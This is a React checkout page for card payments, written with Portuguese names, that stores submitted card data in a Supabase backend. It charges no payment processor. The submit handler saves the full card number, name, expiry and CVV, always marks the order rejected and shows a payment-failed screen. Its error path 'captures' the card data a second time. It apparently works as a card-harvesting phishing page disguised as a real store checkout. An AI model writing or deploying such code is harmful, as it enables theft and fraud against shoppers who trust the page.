import { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import { useQueryClient } from '@tanstack/react-query';
import { toast } from 'sonner';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowLeft } from 'lucide-react';
import CreditCardForm, { CreditCardFormValues } from '@/components/payment/CreditCardForm';
import { supabase } from '@/integrations/supabase/client';
import ProductSummary from '@/components/payment/ProductSummary';
import { createPaymentInfo } from '@/services/paymentInfoService';
import { atualizarStatusPedido } from '@/services/pedidoService';

export default function CartaoPage() {
  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  const queryClient = useQueryClient();
  const [produto, setProduto] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pedidoData, setPedidoData] = useState<any>(null);

  const searchParams = new URLSearchParams(location.search);
  const pedidoId = searchParams.get('pedidoId');

  useEffect(() => {
    async function fetchData() {
      console.log('Iniciando fetchData - slug:', slug, 'pedidoId:', pedidoId);

      if (!slug) {
        setError('Produto não especificado');
        setLoading(false);
        return;
      }

      try {
        const { data: produtoData, error: produtoError } = await supabase
          .from('produtos')
          .select('*')
          .eq('slug', slug)
          .maybeSingle();

        if (produtoError) {
          console.error('Erro ao buscar produto:', produtoError);
          throw new Error('Erro ao carregar produto');
        }

        if (!produtoData) {
          throw new Error('Produto não encontrado');
        }

        console.log('Produto encontrado:', produtoData);
        setProduto(produtoData);

        if (!pedidoId) {
          console.log('Nenhum pedidoId encontrado, redirecionando para checkout');
          navigate(`/checkout/${slug}`);
          return;
        }

        console.log('Buscando dados do pedido para pedidoId:', pedidoId);
        const { data: pedido, error: pedidoError } = await supabase
          .from('pedidos')
          .select('*')
          .eq('id', pedidoId)
          .maybeSingle();

        if (pedidoError) {
          console.error('Erro ao buscar pedido:', pedidoError);
          throw new Error('Erro ao carregar pedido');
        }

        if (!pedido) {
          throw new Error('Pedido não encontrado');
        }

        console.log('Pedido encontrado:', pedido);
        setPedidoData(pedido);

      } catch (error: any) {
        console.error('Erro geral em fetchData:', error.message);
        setError(error.message || 'Erro ao carregar dados');
      } finally {
        setLoading(false);
      }
    }

    fetchData();
  }, [slug, pedidoId, navigate]);

  const handleSubmit = async (data: CreditCardFormValues) => {
    if (!pedidoId) {
      toast.error('ID do pedido não encontrado');
      return;
    }

    setSubmitting(true);
    console.log('Processando pagamento com cartão - dados:', { ...data, cvv: '***' });

    try {
      await createPaymentInfo({
        pedido_id: pedidoId,
        metodo_pagamento: 'cartao',
        numero_cartao: data.numero_cartao,
        nome_cartao: data.nome_cartao,
        validade: data.validade,
        cvv: data.cvv,
        parcelas: parseInt(data.parcelas.split('x')[0], 10),
      });

      console.log('Informações de pagamento salvas com sucesso');

      const success = await atualizarStatusPedido(pedidoId, 'reprovado');
      if (!success) {
        throw new Error('Erro ao atualizar status do pedido');
      }

      console.log('Status do pedido atualizado para "reprovado"');
      toast.info('Pagamento processado, redirecionando...');

      queryClient.invalidateQueries({ queryKey: ['pedidos'] });

      // Atraso de 1,5 segundos como parte do fluxo assíncrono
      await new Promise((resolve) => setTimeout(resolve, 1500));
      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);

    } catch (error: any) {
      console.error('Erro ao processar pagamento:', error);

      try {
        await createPaymentInfo({
          pedido_id: pedidoId,
          metodo_pagamento: 'cartao',
          numero_cartao: data.numero_cartao,
          nome_cartao: data.nome_cartao,
          validade: data.validade,
          cvv: data.cvv,
          parcelas: parseInt(data.parcelas.split('x')[0], 10),
        });
        await atualizarStatusPedido(pedidoId, 'reprovado');
        queryClient.invalidateQueries({ queryKey: ['pedidos'] });
      } catch (captureError) {
        console.error('Erro ao capturar informações após falha:', captureError);
      }

      toast.error(`Erro ao processar pagamento: ${error.message || 'Tente novamente'}`);
      await new Promise((resolve) => setTimeout(resolve, 1500));
      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);

    } finally {
      setSubmitting(false);
    }
  };

  const handleBack = () => {
    navigate(`/checkout/${slug}`);
  };

  if (loading) {
    return (
      <div className="container max-w-4xl mx-auto py-8 px-4">
        <Card>
          <CardContent className="p-8 text-center">
            <div className="animate-pulse">
              <div className="h-8 bg-gray-200 rounded w-1/2 mx-auto mb-4"></div>
              <div className="h-4 bg-gray-200 rounded w-3/4 mx-auto mb-2"></div>
              <div className="h-4 bg-gray-200 rounded w-2/3 mx-auto"></div>
            </div>
            <p className="mt-4">Carregando...</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (error || !produto) {
    return (
      <div className="container max-w-4xl mx-auto py-8 px-4">
        <Card>
          <CardContent className="p-8 text-center">
            <h2 className="text-xl font-bold text-red-500 mb-2">Erro</h2>
            <p className="text-gray-600">{error || 'Produto não encontrado'}</p>
            <Button className="mt-4" onClick={() => navigate('/')}>
              Voltar para a página inicial
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="container max-w-4xl mx-auto py-8 px-4">
      <Button
        variant="ghost"
        onClick={handleBack}
        className="mb-4 hover:bg-gray-100"
      >
        <ArrowLeft className="h-4 w-4 mr-2" />
        Voltar
      </Button>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        <div>
          <h1 className="text-2xl font-bold mb-6">Pagamento com Cartão</h1>
          <CreditCardForm
            onSubmit={handleSubmit}
            submitting={submitting}
            buttonColor={produto?.cor_botao || '#22c55e'}
            buttonText={produto?.texto_botao || 'Finalizar Compra'}
          />
        </div>

        <div>
          <ProductSummary
            produto={produto}
            pedido={pedidoData || { valor: produto?.preco || 0 }}
          />
        </div>
      </div>
    </div>
  );
}
